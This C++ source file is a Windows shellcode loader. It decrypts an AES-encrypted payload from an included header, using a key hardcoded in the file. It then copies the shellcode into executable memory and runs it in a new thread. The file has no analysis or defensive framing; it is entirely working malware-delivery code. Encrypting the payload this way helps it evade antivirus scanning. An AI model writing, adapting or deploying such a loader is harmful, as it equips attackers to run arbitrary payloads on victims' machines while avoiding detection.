#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include "embedded_payload.h"  // your AES-encrypted shellcode array

#pragma comment(lib, "crypt32.lib")

const BYTE aesKey[16] = { 'T','h','i','s','I','s','A','1','6','B','y','t','e','K','e','y' };

bool DecryptAES(BYTE* encData, DWORD encLen, BYTE* outBuf, DWORD& outLen) {
    BYTE iv[16];
    memcpy(iv, encData, 16);

    BYTE* cipherText = encData + 16;
    DWORD cipherLen = encLen - 16;

    memcpy(outBuf, cipherText, cipherLen); // Decrypt in-place

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, aesKey, sizeof(aesKey), 0)) return false;
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) return false;
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) return false;

    outLen = cipherLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, outBuf, &outLen)) return false;

    return true;
}

int main() {
    BYTE* decrypted = new BYTE[payload_len];  // payload_len from .h
    DWORD decryptedLen = 0;

    if (!DecryptAES(payload, payload_len, decrypted, decryptedLen)) {
        std::cerr << "[-] Decryption failed.\n";
        return 1;
    }

    LPVOID mem = VirtualAlloc(NULL, decryptedLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, decrypted, decryptedLen);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    delete[] decrypted;
    return 0;
}
